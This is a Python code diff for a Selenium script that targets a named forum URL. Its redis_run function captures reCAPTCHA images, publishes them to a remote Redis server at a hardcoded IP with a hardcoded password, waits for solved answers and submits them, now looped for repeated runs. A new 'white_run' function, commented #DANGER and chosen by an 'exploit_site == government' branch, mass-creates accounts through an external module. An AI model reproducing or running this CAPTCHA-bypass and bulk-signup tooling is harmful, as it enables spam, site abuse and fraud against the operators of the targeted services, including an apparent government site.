@@ -9,6 +9,7 @@ import random
 import string
 from IPython import embed
 from selenium.common.exceptions import NoSuchElementException, ElementNotVisibleException, WebDriverException
+import whiteh
 
 
 vuln_url = "http://drudgeretort.uservoice.com/forums/184052-general/suggestions/3358099-seed-this-forum-with-your-ideas"
@@ -229,29 +230,37 @@ def change_run(url, numIterations, sft):
     f.close()
 
 def redis_run(url, numIterations):
-    import process
-    import redis
-    wb = webdriver.Firefox()
-    wb.get(url)
-    c = 'CMDS'
-    _id = random.randint(0, pow(2,17))
-    element = wb.find_element_by_id("recaptcha_image")
-    img = process.make_html_img(element, wb)
-    rconn = redis.StrictRedis(host='50.17.215.201', port=6379, db=0, password="reallylongandhardtoguesspassword")
-    ps = rconn.pubsub()
-    print _id
-    rconn.publish(c, str(_id) + ":" + img) # I am listening here for the solution
-    ps.subscribe(str(_id))
-    solution = ""
-    for m in ps.listen():
-        if m['type'] == 'message':
-            solution = m.get('data')
-            break
-    print solution
-    field = wb.find_element_by_id('recaptcha_response_field')
-    field.send_keys(solution)
-    field.send_keys('\n')
-    wb.close()
+    for i in range(numIterations):
+        import process
+        import redis
+        wb = webdriver.Firefox()
+        wb.get(url)
+        c = 'CMDS'
+        _id = random.randint(0, pow(2,17))
+        element = wb.find_element_by_id("recaptcha_image")
+        img = process.make_html_img(element, wb)
+        rconn = redis.StrictRedis(host='50.17.215.201', port=6379, db=0, password="reallylongandhardtoguesspassword")
+        ps = rconn.pubsub()
+        print _id
+        rconn.publish(c, str(_id) + img) # I am listening here for the solution
+        ps.subscribe(str(_id))
+        solution = ""
+        for m in ps.listen():
+            if m['type'] == 'message':
+                solution = m.get('data')
+                break
+        print solution
+        field = wb.find_element_by_id('recaptcha_response_field')
+        field.send_keys(solution)
+        field.send_keys('\n')
+        wb.close()
+
+def white_run(url, numIterations): #DANGER
+    for i in range(numIterations):
+        wb = webdriver.Firefox()
+        whoo = whiteh.WhiteHoo(wb)
+        whoo.make_account()
+        wb.close()
 
 if __name__ == '__main__':
     sft = (0, 0)
@@ -270,6 +279,8 @@ if __name__ == '__main__':
         change_run(url, numIterations, sft)
     elif exploit_site == "test":
         redis_run(url, numIterations)
+    elif exploit_site == "government": #DANGER
+        white_run(url, numIterations)
     else:
         print "You must specify which site to use"
 
